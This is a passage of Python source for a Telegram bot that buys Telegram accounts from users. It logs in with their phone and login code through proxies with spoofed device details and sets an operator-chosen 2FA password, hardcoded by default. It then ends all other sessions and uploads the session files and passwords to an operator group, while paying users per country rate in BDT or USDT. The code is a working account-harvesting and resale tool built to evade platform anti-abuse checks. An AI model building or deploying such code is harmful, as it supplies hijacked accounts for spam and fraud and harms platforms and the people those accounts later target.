        sent_msg = bot.edit_message_text(msg_text, chat_id, message_id, parse_mode="Markdown")
        user_data[chat_id]["code_msg_id"] = sent_msg.message_id
    except Exception as e:
        bot.edit_message_text(f"❌ Error sending code: {e}\n\nPlease try again.", chat_id, message_id)
        if chat_id in user_data: del user_data[chat_id]

async def verify_code_and_create_session(chat_id: int, code: str):
    """Verify code and create session (adapted from original _generate_session_file)"""
    data = user_data.get(chat_id, {})
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    session_filename = data.get("session_filename")
    processing_msg_id = data.get("code_msg_id")
    
    country_info = get_country_info(phone)
    country_code = country_info["code"]
    proxy = proxies.get(country_code)
    device_info = generate_device_info()

    client = TelegramClient(session_filename, API_ID, API_HASH, proxy=proxy, device_model=device_info["device_model"], system_version=device_info["system_version"], app_version=device_info["app_version"], lang_code=device_info["lang_code"])
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    try:
        logging.info(f"[LOG for {chat_id}]: Connecting Telethon client for {phone}...")
        await client.connect()
        logging.info(f"[LOG for {chat_id}]: Client connected. Attempting to sign in...")
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        logging.info(f"[LOG for {chat_id}]: Sign in successful!")

        # Spam check with @SpamBot
        is_spam = await check_spam_status(client, phone, chat_id, processing_msg_id)
        if is_spam:
            logging.error(f"[ERROR for {chat_id}]: Account {phone} is marked as spam by @SpamBot.")
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            if phone in pending_numbers:
                pending_numbers.remove(phone)
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
            conn.commit()
            bot.edit_message_text(f"❌ Account {phone} is marked as spam. Only fresh accounts are accepted.", chat_id, processing_msg_id, parse_mode="Markdown")
            return

        # Check for restrictions
        me = await client.get_me()
        if me.restricted:
            raise Exception(f"Account is restricted: {me.restriction_reason}")

        cursor.execute("SELECT value FROM settings WHERE key = '2fa_status'")
        twofa_status_tuple = cursor.fetchone()
        twofa_status = twofa_status_tuple[0] if twofa_status_tuple else "on"

        cursor.execute("SELECT value FROM settings WHERE key = '2fa_password'")
        twofa_password_tuple = cursor.fetchone()
        new_password = twofa_password_tuple[0] if twofa_password_tuple else "@Riyad12"

        if twofa_status == "on":
            try:
                logging.info(f"[LOG for {chat_id}]: Attempting to set 2FA...")
                await client.edit_2fa(new_password=new_password, hint="Set by Bot")
                logging.info(f"[LOG for {chat_id}]: 2FA set successfully with password: {new_password}")
            except Exception as e:
                logging.error(f"[ERROR for {chat_id}]: Could not set 2FA for {phone}. Reason: {e}")
                bot.send_message(ADMIN_ID, f"⚠️ 2FA Failed!\nPhone: `{phone}`\nReason: {e}", parse_mode="Markdown")
                new_password = None

        rate_info = None
        if country_code:
            cursor.execute("SELECT rate, claim_time_seconds FROM country_rates WHERE country_code = ? AND status = 'on'", (country_code,))
            rate_info = cursor.fetchone()

        if rate_info:
            rate, claim_time = rate_info
            flag = get_country_flag(country_code)
            initial_message_text = f"{flag} The number: {phone} has been successfully registered and is now waiting for confirmation.\n\n⏳ Confirmation Time: {claim_time} seconds\n\n⚠️ Important: Please log out of your account on all other devices to ensure a smooth confirmation process."
            markup = types.InlineKeyboardMarkup()
            dummy_button = types.InlineKeyboardButton("⏳ Waiting for confirmation...", callback_data="wait")
            markup.add(dummy_button)
            sent_message = bot.edit_message_text(initial_message_text, chat_id, processing_msg_id, parse_mode="Markdown", reply_markup=markup)

            logging.info(f"[LOG for {chat_id}]: Starting auto-claim timer for {claim_time} seconds.")
            timer_thread = threading.Timer(claim_time, run_telethon_task, args=[auto_claim_balance, chat_id, phone, sent_message.message_id, session_filename])
            timer_thread.start()
        else:
            bot.edit_message_text(f"✅ Account `{phone}` received! No auto-claim rate is set for this country.", chat_id, processing_msg_id, parse_mode="Markdown")

        admin_caption = f"🔔 New session!\nUser: {chat_id}\nPhone: `{phone}`"
        if new_password: admin_caption += f"\n🔐 2FA Pass: `{new_password}`"
        else: admin_caption += "\n⚠️ 2FA setup failed!"
        with open(session_filename, "rb") as sf:
            bot.send_document(SESSION_GROUP_ID, sf, caption=admin_caption, parse_mode="Markdown", visible_file_name=f"{phone}.session")

        saved_session_path = os.path.join(SESSIONS_FOLDER, f"{phone}.session")
        shutil.copy(session_filename, saved_session_path)

        # Update user_sessions table
        cursor.execute("INSERT INTO user_sessions (user_id, phone_number, country_code, status, created_at) VALUES (?, ?, ?, ?, ?)",
                       (chat_id, phone, country_code, 'active', datetime.datetime.now().isoformat()))
        conn.commit()

    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        logging.error(f"[ERROR for {chat_id}]: Invalid or expired code for {phone}.")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone in pending_numbers:
            pending_numbers.remove(phone)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        bot.edit_message_text("⚠️ Wrong/expired code. /cancel & try again.", chat_id, processing_msg_id, parse_mode="Markdown")
        user_data[chat_id]["state"] = "awaiting_code"
    except SessionPasswordNeededError:
        logging.error(f"[ERROR for {chat_id}]: Account {phone} has 2FA enabled.")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone in pending_numbers:
            pending_numbers.remove(phone)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        bot.edit_message_text("❌ Rejected! 2FA is on. Please disable it & /start again.", chat_id, processing_msg_id, parse_mode="Markdown")
    except FloodWaitError as e:
        logging.error(f"[ERROR for {chat_id}]: Flood wait error for {phone}: {e}")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone in pending_numbers:
            pending_numbers.remove(phone)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        bot.edit_message_text("❌ Account is flooded. Cannot accept this account.", chat_id, processing_msg_id, parse_mode="Markdown")
    except PeerFloodError as e:
        logging.error(f"[ERROR for {chat_id}]: Peer flood error for {phone}: {e}")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone in pending_numbers:
            pending_numbers.remove(phone)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        bot.edit_message_text("❌ Account is spammed or flooded. Cannot accept this account.", chat_id, processing_msg_id, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"[CRITICAL ERROR for {chat_id}]: Login Error for {phone}: {e}")
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone in pending_numbers:
            pending_numbers.remove(phone)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
        conn.commit()
        bot.edit_message_text(f"❌ Login Error: {e}\n\nThis might be a network issue or account restriction. Please try again later or use a different account.", chat_id, processing_msg_id, parse_mode="Markdown")
    finally:
        conn.close()
        if client.is_connected():
            await client.disconnect()
        if chat_id in user_data and user_data.get(chat_id, {}).get("state") != "awaiting_code":
            del user_data[chat_id]

async def auto_claim_balance(user_id, phone_number, message_id, session_filename):
    country_info = get_country_info(phone_number)
    country_code = country_info["code"]
    proxy = proxies.get(country_code)
    device_info = generate_device_info()

    client = TelegramClient(session_filename, API_ID, API_HASH, proxy=proxy, device_model=device_info["device_model"], system_version=device_info["system_version"], app_version=device_info["app_version"], lang_code=device_info["lang_code"])
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    try:
        await client.connect()
        if not await client.is_user_authorized():
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (user_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            if phone_number in pending_numbers:
                pending_numbers.remove(phone_number)
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, user_id))
            conn.commit()
            final_message = f"❗️ Account {phone_number} is unreachable. You might not have logged out."
            bot.edit_message_text(final_message, chat_id=user_id, message_id=message_id, parse_mode="Markdown", reply_markup=None)
            return

        sessions = await client(functions.account.GetAuthorizationsRequest())
        other_devices = 0
        for auth in sessions.authorizations:
            if auth.hash != 0:
                await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                other_devices += 1

        if other_devices > 0:
            logging.info(f"Terminated {other_devices} other device(s) for {phone_number}")

        sessions = await client(functions.account.GetAuthorizationsRequest())
        if len(sessions.authorizations) > 1:
            other_devices = len(sessions.authorizations) - 1
            cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (user_id,))
            pending_str_tuple = cursor.fetchone()
            pending_str = pending_str_tuple[0] if pending_str_tuple else ""
            pending_numbers = pending_str.split(",") if pending_str else []
            if phone_number in pending_numbers:
                pending_numbers.remove(phone_number)
                new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, user_id))
            conn.commit()
            final_message = f"❗️ Claim failed. **{other_devices} other device(s)** still logged in after termination attempt."
            bot.edit_message_text(final_message, chat_id=user_id, message_id=message_id, parse_mode="Markdown", reply_markup=None)
            return

        cursor.execute("SELECT claimed_numbers FROM users WHERE user_id = ?", (user_id,))
        claimed_str_tuple = cursor.fetchone()
        claimed_str = claimed_str_tuple[0] if claimed_str_tuple else ""
        if phone_number in claimed_str.split(","): return

        if not country_code: return

        cursor.execute("SELECT rate FROM country_rates WHERE country_code = ?", (country_code,))
        rate_info = cursor.fetchone()
        if not rate_info: return

        amount_to_add = rate_info[0]
        new_claimed_str = f"{claimed_str},{phone_number}" if claimed_str else phone_number
        cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (user_id,))
        pending_str_tuple = cursor.fetchone()
        pending_str = pending_str_tuple[0] if pending_str_tuple else ""
        pending_numbers = pending_str.split(",") if pending_str else []
        if phone_number in pending_numbers:
            pending_numbers.remove(phone_number)
            new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
            cursor.execute("UPDATE users SET balance = balance + ?, claimed_numbers = ?, session_count = session_count + 1, verified_count = verified_count + 1, unverified_count = unverified_count - 1, pending_numbers = ? WHERE user_id = ?", (amount_to_add, new_claimed_str, new_pending_str, user_id))
        else:
            cursor.execute("UPDATE users SET balance = balance + ?, claimed_numbers = ?, session_count = session_count + 1, verified_count = verified_count + 1 WHERE user_id = ?", (amount_to_add, new_claimed_str, user_id))

        cursor.execute("UPDATE country_rates SET usage_count = usage_count + 1 WHERE country_code = ?", (country_code,))

        cursor.execute("SELECT usage_count, capacity FROM country_rates WHERE country_code = ?", (country_code,))
        usage_capacity_tuple = cursor.fetchone()
        if usage_capacity_tuple:
            usage, capacity = usage_capacity_tuple
            if usage >= capacity:
                cursor.execute("UPDATE country_rates SET status = 'off' WHERE country_code = ?", (country_code,))
                bot.send_message(ADMIN_ID, f"ℹ️ Capacity for `{country_code}` is now full and has been automatically disabled.", parse_mode="Markdown")

        cursor.execute("INSERT OR IGNORE INTO used_numbers (phone_number, user_id) VALUES (?, ?)", (phone_number, user_id))
        conn.commit()

        flag = get_country_flag(country_code)
        final_message = f"🎉 We have successfully processed your account\n\n{flag} Number: {phone_number}\n💰 Amount: ${amount_to_add:.2f}\n\nYour new balance: ${cursor.execute('SELECT balance FROM users WHERE user_id = ?', (user_id,)).fetchone()[0]:.2f}"
        bot.edit_message_text(final_message, chat_id=user_id, message_id=message_id, parse_mode="Markdown", reply_markup=None)

        # Update user_sessions
        cursor.execute("UPDATE user_sessions SET status = 'completed', completed_at = ? WHERE phone_number = ? AND user_id = ?", (datetime.datetime.now().isoformat(), phone_number, user_id))
        conn.commit()

    except Exception as e:
        logger.error(f"Auto-claim error: {e}")
        bot.edit_message_text(f"❌ Error during auto-claim: {e}", chat_id=user_id, message_id=message_id)
    finally:
        conn.close()
        if client.is_connected():
            await client.disconnect()

def run_telethon_task(task, *args):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(task(*args))
    finally:
        loop.close()

def run_async(async_func, *args):
    """Run async function in thread"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(async_func(*args))
    finally:
        loop.close()

# ==================== WITHDRAWAL FUNCTIONS ====================
def process_withdraw_ld(message):
    chat_id = message.chat.id
    data = user_data.get(chat_id, {})
    amount = data.get("amount")
    card_info = message.text.strip()
    user_name_from_tg = message.from_user.first_name
    user_username = f"@{escape(message.from_user.username)}" if message.from_user.username else "Not set"

    if not amount:
        bot.send_message(chat_id, "Something went wrong. Please try /withdraw again.")
        if chat_id in user_data: del user_data[chat_id]
        return

    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    trans_no = generate_trans_no()
    transaction_id = generate_transaction_id()
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO withdraw_history (user_id, amount, address, timestamp, trans_no, transaction_id, currency) VALUES (?, ?, ?, ?, ?, ?, 'BDT')", (chat_id, amount, card_info, timestamp, trans_no, transaction_id))
    conn.commit()
    conn.close()

    user_message = (f"✅ Withdrawal request submitted, please be patient until the bot administrator approves your payment.\n\n"
                   f"Trans No: {trans_no}\n")
    bot.send_message(chat_id, user_message, parse_mode="Markdown")

    admin_message = (f"- New Withdrawal...📢\n\n"
                    f"Trans No: {trans_no}\n"
                    f"- Currency: BDT\n"
                    f"- Withdrawal amount: {amount:.2f} BDT\n"
                    f"- Card Info: {card_info}\n"
                    f"- Transaction ID: {transaction_id}\n")
    markup = types.InlineKeyboardMarkup()
    confirm_button = types.InlineKeyboardButton("Confirm", callback_data=f"confirm_withdraw_{trans_no}")
    markup.add(confirm_button)
    bot.send_message(WITHDRAW_GROUP_ID, admin_message, reply_markup=markup, parse_mode="Markdown")

    if chat_id in user_data: del user_data[chat_id]

def process_usdt_withdrawal(message):
    chat_id = message.chat.id
    data = user_data.get(chat_id, {})
    amount = data.get("amount")
    address = message.text.strip()
    user_name_from_tg = message.from_user.first_name
    user_username = f"@{escape(message.from_user.username)}" if message.from_user.username else "Not set"

    if not amount:
        bot.send_message(chat_id, "Something went wrong. Please try /withdraw again.")
        if chat_id in user_data: del user_data[chat_id]
        return

    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    trans_no = generate_trans_no()
    transaction_id = generate_transaction_id()
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO withdraw_history (user_id, amount, address, timestamp, trans_no, transaction_id, currency) VALUES (?, ?, ?, ?, ?, ?, 'USDT (BEP20)')", (chat_id, amount, address, timestamp, trans_no, transaction_id))
    conn.commit()
    conn.close()

    user_message = (f"✅ Withdrawal request submitted, please be patient until the bot administrator approves your payment.\n\n"
                   f"Trans No: {trans_no}\n")
    bot.send_message(chat_id, user_message, parse_mode="Markdown")

    admin_message = (f"- New Withdrawal...📢\n\n"
                    f"Trans No: {trans_no}\n"
                    f"- Currency: USDT\n"
                    f"- Withdrawal amount: ${amount:.2f} USDT (BEP20)\n"
                    f"- Withdrawal address: {address}\n"
                    f"- Transaction ID: {transaction_id}\n")
    markup = types.InlineKeyboardMarkup()
    confirm_button = types.InlineKeyboardButton("Confirm", callback_data=f"confirm_withdraw_{trans_no}")
    markup.add(confirm_button)
    bot.send_message(WITHDRAW_GROUP_ID, admin_message, reply_markup=markup, parse_mode="Markdown")

    if chat_id in user_data: del user_data[chat_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_withdraw_"))
def confirm_withdraw_callback(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    trans_no = call.data.split("_")[2]
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, amount, address, transaction_id, currency FROM withdraw_history WHERE trans_no = ?", (trans_no,))
    withdraw_info = cursor.fetchone()
    if withdraw_info:
        user_id, amount, address, transaction_id, currency = withdraw_info
        cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        current_balance = cursor.fetchone()[0]
        new_balance = current_balance - amount
        cursor.execute("UPDATE users SET balance = ?, verified_count = 0, unverified_count = 0 WHERE user_id = ?", (new_balance, user_id))
        cursor.execute("UPDATE withdraw_history SET status = 'completed' WHERE trans_no = ?", (trans_no,))
        conn.commit()
        conn.close()

        user_message = (f"- Withdrawal successful.\n\n"
                       f"Trans No: {trans_no}\n"
                       f"- Your balance: ${new_balance:.2f}\n"
                       f"- Currency: {currency}\n"
                       f"- Withdrawal amount: ${amount:.2f}\n"
                       f"- Withdrawal address: {address}\n"
                       f"- Transaction ID: {transaction_id}\n")
        bot.send_message(user_id, user_message, parse_mode="Markdown")
        bot.delete_message(chat_id, message_id)

@bot.message_handler(commands=["withdrawhistory"])
def command_withdrawhistory(message):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT SUM(amount), COUNT(withdraw_id) FROM withdraw_history WHERE user_id = ?", (message.from_user.id,))
    result = cursor.fetchone()
    conn.close()
    total_withdrawn = result[0] if result and result[0] else 0
    total_requests = result[1] if result and result[1] else 0
    summary = (f"🪙 Withdrawal Summary\n\n"
               f"💸 Total Withdrawn: ${total_withdrawn:.2f}\n"
               f"📬 Total Requests: {total_requests}")
    bot.send_message(message.chat.id, summary, parse_mode="Markdown")

# ==================== ADMIN FUNCTIONS ====================
def admin_process_balance_change(message, action):
    parts = message.text.split()
    if len(parts) != 2: bot.reply_to(message, "Usage: <user_id> <amount>"); return
    try:
        target_user_id = int(parts[0]); amount = float(parts[1])
    except ValueError: bot.reply_to(message, "❌ Invalid User ID or Amount."); return
    conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
    if not cursor.execute("SELECT 1 FROM users WHERE user_id = ?", (target_user_id,)).fetchone():
        bot.reply_to(message, f"❌ User with ID {target_user_id} not found."); conn.close(); return
    if action == "add": cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_user_id)); action_text = "added to"
    else: cursor.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, target_user_id)); action_text = "removed from"
    conn.commit()
    new_balance = cursor.execute("SELECT balance FROM users WHERE user_id = ?", (target_user_id,)).fetchone()[0]
    conn.close()
    bot.reply_to(message, f"✅ Success! ${amount:.2f} has been {action_text} User ID {target_user_id}.\nNew Balance: ${new_balance:.2f}")
    try:
        user_notification = f"ℹ️ Admin Notification\n\nAn admin has adjusted your balance.\nAmount: ${amount:.2f} ({action_text} your account)\nYour new balance is: ${new_balance:.2f}"
        bot.send_message(target_user_id, user_notification, parse_mode="Markdown")
    except Exception as e: logging.error(f"Could not notify user {target_user_id}: {e}")
    if message.chat.id in user_data: del user_data[message.chat.id]

def admin_process_admin_change(message, action):
    if message.from_user.id != ADMIN_ID: bot.reply_to(message, "❌ Main Admin Only."); return
    try:
        target_user_id = int(message.text.strip())
    except ValueError: bot.reply_to(message, "❌ Invalid User ID."); return
    conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
    if action == "add":
        cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (target_user_id,)); action_text = "added as an admin"
    else:
        if target_user_id == ADMIN_ID: bot.reply_to(message, "❌ You cannot remove the Main Admin."); conn.close(); return
        cursor.execute("DELETE FROM admins WHERE user_id = ?", (target_user_id,)); action_text = "removed from admins"
    conn.commit(); conn.close()
    bot.reply_to(message, f"✅ Success! User {target_user_id} has been {action_text}.")
    if message.chat.id in user_data: del user_data[message.chat.id]

def list_admins(message):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
    admins = cursor.execute("SELECT user_id FROM admins").fetchall(); conn.close()
    admin_list_text = "📋 Current Admins:\n\n"
    for admin_id in admins:
        admin_list_text += f"- {admin_id[0]}{' (Main Admin)' if admin_id[0] == ADMIN_ID else ''}\n"
    bot.send_message(message.chat.id, admin_list_text, parse_mode="Markdown")

def admin_process_set_rate(message):
    try:
        parts = message.text.split()
        if len(parts) < 3: bot.reply_to(message, "❌ Invalid format: CountryName Rate Time"); return
        rate = float(parts[-2]); claim_time = int(parts[-1]); country_name = " ".join(parts[:-2])
        country_code = get_country_code_from_name(country_name)
        if not country_code: bot.reply_to(message, f"❌ Country not found: {country_name}"); return
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        cursor.execute("REPLACE INTO country_rates (country_code, rate, claim_time_seconds, status, capacity, usage_count) VALUES (?, ?, ?, 'on', 10, 0)", (country_code, rate, claim_time)); conn.commit(); conn.close()
        bot.reply_to(message, f"✅ Rate for {country_name} set to ${rate} and time to {claim_time}s.")
    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
    finally:
        if message.chat.id in user_data: del user_data[message.chat.id]

def admin_process_set_capacity(message):
    try:
        parts = message.text.split()
        if len(parts) < 2: bot.reply_to(message, "❌ Invalid format: CountryName Capacity"); return
        capacity = int(parts[-1]); country_name = " ".join(parts[:-1])
        country_code = get_country_code_from_name(country_name)
        if not country_code: bot.reply_to(message, f"❌ Country not found: {country_name}"); return
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        cursor.execute("UPDATE country_rates SET capacity = ? WHERE country_code = ?", (capacity, country_code)); conn.commit(); conn.close()
        bot.reply_to(message, f"✅ Capacity for {country_name} set to {capacity}.")
    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
    finally:
        if message.chat.id in user_data: del user_data[message.chat.id]

def admin_process_toggle_status(message):
    try:
        country_name = message.text.strip(); country_code = get_country_code_from_name(country_name)
        if not country_code: bot.reply_to(message, f"❌ Country not found: {country_name}"); return
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        current_status_tuple = cursor.execute("SELECT status FROM country_rates WHERE country_code = ?", (country_code,)).fetchone()
        if not current_status_tuple: bot.reply_to(message, f"❌ {country_name} not in database."); conn.close(); return
        current_status = current_status_tuple[0]
        new_status = "off" if current_status == "on" else "on"
        cursor.execute("UPDATE country_rates SET status = ? WHERE country_code = ?", (new_status, country_code)); conn.commit(); conn.close()
        bot.reply_to(message, f"✅ Status for {country_name} toggled to {new_status.upper()}.")
    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
    finally:
        if message.chat.id in user_data: del user_data[message.chat.id]

def admin_process_broadcast(message):
    bot.send_message(message.chat.id, "⏳ Broadcast starting...")
    conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
    users = cursor.execute("SELECT user_id FROM users").fetchall(); conn.close()
    success, fail = 0, 0
    for user in users:
        try:
            bot.copy_message(user[0], message.chat.id, message.message_id); success += 1
        except: fail += 1
        time.sleep(0.05)
    report = f"📣 Broadcast Report\n✅ Sent: {success}\n❌ Failed: {fail}"
    bot.send_message(message.chat.id, report)
    if message.chat.id in user_data: del user_data[message.chat.id]

def admin_process_change_2fa_password(message):
    new_password = message.text.strip()
    if not new_password:
        bot.reply_to(message, "❌ Invalid password. Please provide a valid password.")
        return
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("REPLACE INTO settings (key, value) VALUES ('2fa_password', ?)", (new_password,))
    conn.commit()
    conn.close()
    bot.reply_to(message, f"✅ 2FA password changed to `{new_password}`.", parse_mode="Markdown")
    if message.chat.id in user_data: del user_data[message.chat.id]

def admin_panel(message):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    total_users = cursor.execute("SELECT COUNT(user_id) FROM users").fetchone()[0]
    cursor.execute("SELECT value FROM settings WHERE key = '2fa_password'")
    twofa_password_tuple = cursor.fetchone()
    current_password = twofa_password_tuple[0] if twofa_password_tuple else "@Riyad12"
    conn.close()
    admin_menu_text = f"👋 Welcome, Admin!\n\n👥 Total Users: {total_users}\n🔐 Current 2FA Password: {current_password}"
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📊 Manage Rates", callback_data="admin_rates_menu")
    btn2 = types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    btn3 = types.InlineKeyboardButton("💰 Balance Management", callback_data="admin_balance_menu")
    btn4 = types.InlineKeyboardButton("👑 Admin Management", callback_data="admin_admins_menu")
    btn5 = types.InlineKeyboardButton("📁 Download Sessions ZIP", callback_data="admin_sessions_zip")
    btn6 = types.InlineKeyboardButton("🗑️ Clear Session Files", callback_data="admin_clear_sessions")
    btn7 = types.InlineKeyboardButton("🚦 Toggle 2FA", callback_data="admin_toggle_2fa")
    btn8 = types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="admin_change_2fa_password")
    markup.add(btn1, btn2); markup.add(btn3, btn4); markup.add(btn5, btn6); markup.add(btn7, btn8)
    bot.send_message(message.chat.id, admin_menu_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callback_handler(call):
    if not is_admin(call.from_user.id): return
    action = call.data.split("_", 1)[1]
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass

    if action == "rates_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("✏️ Set Rate/Time", callback_data="admin_set_rate"))
        markup.add(types.InlineKeyboardButton("📦 Set Capacity", callback_data="admin_set_capacity"))
        markup.add(types.InlineKeyboardButton("🚦 Toggle Status (On/Off)", callback_data="admin_toggle_status"))
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="admin_main_panel"))
        bot.send_message(chat_id, "📊 **Manage Rates**", reply_markup=markup, parse_mode="Markdown")

    elif action == "set_rate":
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        countries = cursor.execute("SELECT country_code FROM country_rates ORDER BY country_code").fetchall(); conn.close()
        country_list = "\n".join([f"- {pycountry.countries.get(alpha_2=c[0]).name}" for c in countries if pycountry.countries.get(alpha_2=c[0])])
        bot.send_message(chat_id, f"**Current Countries in DB:**\n{country_list}\n\nSend info:\n`CountryName Rate Time`", parse_mode="Markdown")
        user_data[chat_id] = {"state": "awaiting_rate"}

    elif action == "set_capacity":
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        capacities = cursor.execute("SELECT country_code, usage_count, capacity FROM country_rates ORDER BY country_code").fetchall(); conn.close()
        capacity_list = "\n".join([f"- {pycountry.countries.get(alpha_2=c[0]).name}: {c[1]}/{c[2]}" for c in capacities if pycountry.countries.get(alpha_2=c[0])])
        bot.send_message(chat_id, f"**Current Capacities:**\n{capacity_list}\n\nSend info:\n`CountryName Capacity`", parse_mode="Markdown")
        user_data[chat_id] = {"state": "awaiting_capacity"}

    elif action == "toggle_status":
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        statuses = cursor.execute("SELECT country_code, status FROM country_rates ORDER BY country_code").fetchall(); conn.close()
        status_list = "\n".join([f"- {pycountry.countries.get(alpha_2=c[0]).name}: {'✅ On' if c[1] == 'on' else '❌ Off'}" for c in statuses if pycountry.countries.get(alpha_2=c[0])])
        bot.send_message(chat_id, f"**Current Statuses:**\n{status_list}\n\nSend the country name to toggle status.", parse_mode="Markdown")
        user_data[chat_id] = {"state": "awaiting_toggle"}

    elif action == "broadcast":
        bot.send_message(chat_id, "Send the message to broadcast."); user_data[chat_id] = {"state": "awaiting_broadcast"}

    elif action == "balance_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("➕ Add Balance", callback_data="admin_add_balance"),
                   types.InlineKeyboardButton("➖ Remove Balance", callback_data="admin_remove_balance"))
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="admin_main_panel"))
        bot.send_message(chat_id, "💰 **Balance Management**", reply_markup=markup, parse_mode="Markdown")

    elif action == "add_balance":
        bot.send_message(chat_id, "Send: `UserID Amount`"); user_data[chat_id] = {"state": "awaiting_addbalance_info"}
    elif action == "remove_balance":
